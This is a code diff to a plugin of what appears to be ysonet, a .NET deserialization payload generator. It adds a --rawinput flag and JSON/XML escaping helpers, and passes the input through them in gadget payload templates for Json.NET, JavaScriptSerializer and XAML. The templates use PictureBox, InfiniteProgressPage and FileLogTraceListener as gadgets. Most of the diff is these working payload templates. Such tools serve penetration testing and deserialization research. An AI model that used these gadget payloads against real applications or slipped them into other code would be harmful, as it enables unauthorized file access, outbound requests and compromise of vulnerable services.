@@ -18,6 +18,7 @@ namespace ysonet.Plugins
         private static bool showList;
         private static bool test;
         private static bool minify;
+        private static bool rawInput;
         private static readonly OptionSet options = new OptionSet
         {
             {
@@ -29,6 +30,11 @@ namespace ysonet.Plugins
             {"i|input=", "input to the payload", v => input = v},
             {"g|payload=", "payload to use", v => gadget = v},
             {"f|formatter=", "Formatter to use", v => formatter = v},
+            {"rawinput", "pass the input verbatim into the payload template instead of escaping it for the chosen formatter. By default the input is escaped so a natural path like C:\\dir works (a raw backslash is an invalid JSON escape); use this only when you need to supply already-escaped or literal content.", v =>
+                {
+                    if (v != null) rawInput = true;
+                }
+            },
             {
                 "t", "test payload (execute after generation)", v =>
                 {
@@ -89,6 +95,21 @@ Exemplary usage:
         }
 
         //PictureBox payload
+        // Escape the user input so it is safe inside the chosen formatter's template. A raw
+        // backslash in a JSON string is an invalid escape (for example a path like C:\dir
+        // becomes C:<TAB>ir), which breaks the payload and the --minify re-parse; XML attribute
+        // values need their own escaping. Both default ON so a natural path just works; the
+        // --rawinput flag passes the value through unchanged for full control.
+        private static string JsonInput(string value)
+        {
+            return rawInput ? value : CommandArgSplitter.JsonStringEscape(value);
+        }
+
+        private static string XmlAttrInput(string value)
+        {
+            return rawInput ? value : CommandArgSplitter.XmlStringAttributeEscape(value);
+        }
+
         public string PictureBox(string input, string formatter)
         {
 
@@ -100,7 +121,7 @@ Exemplary usage:
 {
     '$type':'System.Windows.Forms.PictureBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
     'WaitOnLoad':'true',
-    'ImageLocation':'" + input + @"'
+    'ImageLocation':'" + JsonInput(input) + @"'
 }";
             }
             else if (formatter.ToLower() == "javascriptserializer")
@@ -109,12 +130,12 @@ Exemplary usage:
 {
     '__type':'System.Windows.Forms.PictureBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
     'WaitOnLoad':'true',
-    'ImageLocation':'" + input + @"'
+    'ImageLocation':'" + JsonInput(input) + @"'
 }";
             }
             else if (formatter.ToLower() == "xaml")
             {
-                payload = @"<PictureBox WaitOnLoad=""true"" ImageLocation=""" + input + @""" xmlns=""clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
+                payload = @"<PictureBox WaitOnLoad=""true"" ImageLocation=""" + XmlAttrInput(input) + @""" xmlns=""clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
 </PictureBox>
 ";
             }
@@ -139,7 +160,7 @@ Exemplary usage:
                 payload = @"
 {
     '$type':'Microsoft.ApplicationId.Framework.InfiniteProgressPage, Microsoft.ApplicationId.Framework, Version=10.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
-    'AnimatedPictureFile':'" + input + @"'
+    'AnimatedPictureFile':'" + JsonInput(input) + @"'
 }";
             }
             else if (formatter.ToLower() == "javascriptserializer")
@@ -147,13 +168,13 @@ Exemplary usage:
                 payload = @"
 {
     '__type':'Microsoft.ApplicationId.Framework.InfiniteProgressPage, Microsoft.ApplicationId.Framework, Version=10.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
-    'AnimatedPictureFile':'" + input + @"'
+    'AnimatedPictureFile':'" + JsonInput(input) + @"'
 }";
             }
             else if (formatter.ToLower() == "xaml")
             {
                 payload = @"
-<InfiniteProgressPage AnimatedPictureFile=""" + input + @""" xmlns=""clr-namespace:Microsoft.ApplicationId.Framework;assembly=Microsoft.ApplicationId.Framework"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
+<InfiniteProgressPage AnimatedPictureFile=""" + XmlAttrInput(input) + @""" xmlns=""clr-namespace:Microsoft.ApplicationId.Framework;assembly=Microsoft.ApplicationId.Framework"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
 </InfiniteProgressPage>
 ";
             }
@@ -176,7 +197,7 @@ Exemplary usage:
                 payload = @"
 {
     '$type':'Microsoft.VisualBasic.Logging.FileLogTraceListener, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a',
-    'CustomLocation':'" + input + @"'
+    'CustomLocation':'" + JsonInput(input) + @"'
 }";
             }
             else if (formatter.ToLower() == "javascriptserializer")
@@ -184,13 +205,13 @@ Exemplary usage:
                 payload = @"
 {
     '__type':'Microsoft.VisualBasic.Logging.FileLogTraceListener, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a',
-    'CustomLocation':'" + input + @"'
+    'CustomLocation':'" + JsonInput(input) + @"'
 }";
             }
             else if (formatter.ToLower() == "xaml")
             {
                 payload = @"
-<FileLogTraceListener CustomLocation=""" + input + @""" Filter=""{assembly:Null}"" xmlns=""clr-namespace:Microsoft.VisualBasic.Logging;assembly=Microsoft.VisualBasic"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
+<FileLogTraceListener CustomLocation=""" + XmlAttrInput(input) + @""" Filter=""{assembly:Null}"" xmlns=""clr-namespace:Microsoft.VisualBasic.Logging;assembly=Microsoft.VisualBasic"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
 </FileLogTraceListener>";
             }
             else
